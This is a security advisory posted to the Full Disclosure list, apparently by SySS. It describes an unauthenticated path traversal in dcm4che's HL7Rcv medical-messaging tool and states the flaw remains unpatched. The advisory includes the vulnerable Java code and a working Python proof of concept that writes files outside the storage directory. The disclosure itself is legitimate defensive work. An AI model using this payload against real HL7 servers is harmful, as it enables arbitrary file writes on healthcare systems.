---
title: [SYSS-2026-078]: dcm4che - Path Traversal (CWE-22)
url: https://seclists.org/fulldisclosure/2026/Oct/23
source: Full Disclosure
date: 2026-10-15
fetch_date: 2026-10-16T06:37:50.012949
---

# [SYSS-2026-078]: dcm4che - Path Traversal (CWE-22)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-078]: dcm4che - Path Traversal (CWE-22)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 15 Oct 2026 09:32:05 +0200

---

```
Advisory ID:               SYSS-2026-078
Product:                   dcm4che
Manufacturer:              J4Care
Affected Version(s):       5.35.0
Tested Version(s):         5.35.0
```

Vulnerability Type: Improper Limitation of a Pathname to a
Restricted Directory ('Path Traversal') (CWE-22)

```
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-08-06
Public Disclosure:         2026-10-13
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:
```

dcm4che is a Java-based Digital Imaging and Communications in Medicine
(DICOM)
toolkit providing libraries and command-line utilities for processing,
storing,

```
and transmitting DICOM data (see [1]).

The HL7Rcv command-line tool in dcm4che is vulnerable to a path traversal
attack. An attacker who can send HL7 MLLP messages to a running HL7Rcv
server can write arbitrary files outside the configured storage directory
by injecting "../" sequences into the HL7 MSH-9 (Message Type) field.

This allows unauthenticated remote attackers to achieve arbitrary file
write on the target system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The HL7Rcv tool receives HL7 messages over the Minimal Lower Layer Protocol
(MLLP) via TCP. When a message is received and stored, the HL7 message type
field (MSH-9) is used directly as a directory name in a file constructor
without any path sanitization (see HL7Rcv.java:254-259):

  private UnparsedHL7Message onMessage(UnparsedHL7Message msg)
              throws Exception {
      if (storageDir != null)
          storeToFile(msg.data(), new File(
                  new File(storageDir, msg.msh().getMessageType()),
                          useUUIDForFilename
                                  ? UUID.randomUUID().toString()
                                  : msg.msh().getField(9, "_NULL_")));

The getMessageType() method (HL7Segment.java) returns the raw MSH-9 field
value verbatim. If an attacker sends an HL7 message where MSH-9 contains
path traversal sequences (e.g. "../outside"), the resulting file path
escapes the configured storage directory.

The storeToFile() method (HL7Rcv.java:271-280) then calls mkdirs() to
create the traversed directory structure and writes the file:

  private void storeToFile(byte[] data, File f) throws IOException {
      Connection.LOG.info("M-WRITE {}", f);
      f.getParentFile().mkdirs();
      try (FileOutputStream out = new FileOutputStream(f)) {
          out.write(data);
      }
  }

No path normalization or boundary check is performed.

The MSH-10 (Message Control ID) field is used as the leaf filename, so the
attacker controls both the traversal path (MSH-9) and the filename (MSH-10).

Because HL7 MLLP carries no authentication, this attack can be executed
from any network location with access to the HL7Rcv TCP port. A raw TCP
connection sending a well-formed HL7 message with the MLLP framing bytes
(SOM 0x0B / EOM 0x1C 0x0D) is sufficient.

The root cause is the missing validation of the MSH-9 field value before
it is used as a file path component.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The path traversal can be demonstrated by sending a crafted HL7 message
over a raw TCP connection using the following Python script.

The storage directory (in this example "/tmp/hl7storage") has to be
created before starting hl7rcv and running the PoC exploit.

cat > poc.py << 'EOF'
#!/usr/bin/env python3
import socket, os

# Start hl7rcv: hl7rcv --directory /tmp/hl7storage -b 127.0.0.1:25018

# Malicious HL7 message with path traversal in MSH-9 (directory)
# and attacker-controlled filename in MSH-10 (Message Control ID)
hl7 = ("MSH|^~\\&|SEND|-|RECV|-|"
     "20240101000000||../outside_hl7|exploit.log|P|2.5\r"
     "PID|1||12345||Test^Patient\r")
mllp = b"\x0b" + hl7.encode("ascii") + b"\x1c\r"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 25018))
sock.sendall(mllp)
ack = sock.recv(4096)
sock.close()

# Verify: file written at /tmp/outside_hl7/exploit.log
print(os.path.exists("/tmp/outside_hl7/exploit.log"))
EOF

The file is written to /tmp/outside_hl7/exploit.log, one directory level
above the configured storage directory, confirming the path traversal.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-08-06: Vulnerability reported to manufacturer
2026-09-04: Vulnerability reported to manufacturer again
2026-10-13: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] dcm4che project website
    https://www.dcm4che.org/
[2] SySS Security Advisory SYSS-2026-078
```

<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-078.txt>

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc>

```
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS
website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 4.0
URL: https://creativecommons.org/licenses/by/4.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-23/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

### Current thread:

* **[SYSS-2026-078]: dcm4che - Path Traversal (CWE-22)** *Matthias Deeg via Fulldisclosure (Oct 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https:/...